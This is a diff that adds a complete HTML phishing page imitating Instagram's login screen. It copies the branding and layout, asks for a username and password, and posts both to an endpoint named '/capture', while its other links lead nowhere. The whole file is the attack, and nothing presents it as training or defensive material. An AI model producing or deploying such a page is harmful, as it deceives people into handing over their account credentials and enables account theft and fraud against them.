@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="/static/favicon.ico" type="image/x-icon"> <!-- Favicon -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cookie&display=swap'); /* Similar to Instagram's font */
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            width: 360px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .container h1 {
+            font-family: 'Cookie', cursive;
+            font-size: 4rem;
+            color: #262626;
+            margin: 20px 0;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background: #fafafa;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #3182ce;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .or-divider div {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .or-divider span {
+            margin: 0 10px;
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        <form action="/capture" method="POST">
+            <input type="text" name="username" placeholder="Phone number, email, or username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="or-divider">
+            <div></div>
+            <span>OR</span>
+            <div></div>
+        </div>
+        <a href="#">Log in with Facebook</a>
+        <p style="margin-top: 20px; color: #8e8e8e; font-size: 0.8rem;">
+            Forgot your login details? <a href="#">Get help logging in.</a>
+        </p>
+    </div>
+</body>
+</html>
